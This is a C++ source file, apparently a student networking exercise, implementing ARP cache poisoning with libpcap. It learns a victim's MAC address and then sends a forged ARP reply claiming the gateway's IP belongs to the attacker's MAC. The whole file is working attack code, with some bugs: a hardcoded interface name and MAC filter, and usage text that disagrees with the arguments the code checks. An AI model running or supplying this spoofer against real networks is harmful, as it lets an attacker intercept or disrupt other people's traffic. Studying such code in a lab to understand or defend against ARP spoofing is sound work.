#include "stdafx.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)

#define HWADDR_len 6

struct EthArpPacket final { // https://nirsa.tistory.com/27 arp header
    EthHdr eth_; // 14 byte
    ArpHdr arp_; // 28 byte
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void get_my_mac(uint8_t MAC_str[])
{
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, "eth0");
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i < HWADDR_len; i++)
        MAC_str[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
}

void get_victim_mac(uint8_t attacker_mac[], uint8_t victim_mac[], EthArpPacket L2_arp_packet,
                    uint32_t gateway_ip, uint32_t victim_ip, pcap_t* handle){
    // send arp request
    L2_arp_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    L2_arp_packet.eth_.smac_ = Mac(attacker_mac);
    L2_arp_packet.eth_.type_ = htons(EthHdr::Arp);

    L2_arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    L2_arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
    L2_arp_packet.arp_.hln_ = Mac::SIZE;
    L2_arp_packet.arp_.pln_ = Ip::SIZE;
    L2_arp_packet.arp_.op_ = htons(ArpHdr::Request); // Request: 1, Reply: 2
    L2_arp_packet.arp_.smac_ = Mac(attacker_mac);
    L2_arp_packet.arp_.sip_ = htonl(Ip(gateway_ip));
    L2_arp_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    L2_arp_packet.arp_.tip_ = htonl(Ip(victim_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&L2_arp_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // get arp reply
    struct pcap_pkthdr* header;
    struct libnet_ethernet_hdr *L2_hdr;
    const u_char* packet;

    while (true){
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        L2_hdr = (struct libnet_ethernet_hdr*)(packet);
        if (!(Mac(L2_hdr->ether_dhost) == Mac("2c:8d:b1:e8:e3:01"))){ // if Mac address is equal
            // As host mac is needed, I did copy coding.
            for (int i=0; i < HWADDR_len; i++)
                victim_mac[i] = L2_hdr->ether_shost[i];
            break;
        }
    }
}

void send_forfeit_packet(uint8_t attacker_mac[], uint8_t victim_mac[], EthArpPacket L2_arp_packet,
                    uint32_t gateway_ip, uint32_t victim_ip, pcap_t* handle){
    // send arp reply
    L2_arp_packet.eth_.dmac_ = Mac(victim_mac);
    L2_arp_packet.eth_.smac_ = Mac(attacker_mac);
    L2_arp_packet.eth_.type_ = htons(EthHdr::Arp);

    L2_arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    L2_arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
    L2_arp_packet.arp_.hln_ = Mac::SIZE;
    L2_arp_packet.arp_.pln_ = Ip::SIZE;
    L2_arp_packet.arp_.op_ = htons(ArpHdr::Reply); // Request: 1, Reply: 2
    L2_arp_packet.arp_.smac_ = Mac(attacker_mac);
    L2_arp_packet.arp_.sip_ = htonl(Ip(gateway_ip));
    L2_arp_packet.arp_.tmac_ = Mac(victim_mac);
    L2_arp_packet.arp_.tip_ = htonl(Ip(victim_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&L2_arp_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    // check if the device provides Ethernet header
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
        return -1;
    }

    uint32_t victim_ip = Ip(argv[2]);
    uint32_t gateway_ip = Ip(argv[3]);
    uint8_t attacker_mac[HWADDR_len], victim_mac[HWADDR_len];
    EthArpPacket L2_arp_packet;

    get_my_mac(attacker_mac);
    get_victim_mac(attacker_mac, victim_mac, L2_arp_packet, gateway_ip, victim_ip, handle);

    send_forfeit_packet(attacker_mac, victim_mac, L2_arp_packet, gateway_ip, victim_ip, handle);

	pcap_close(handle);

    return 0;
}
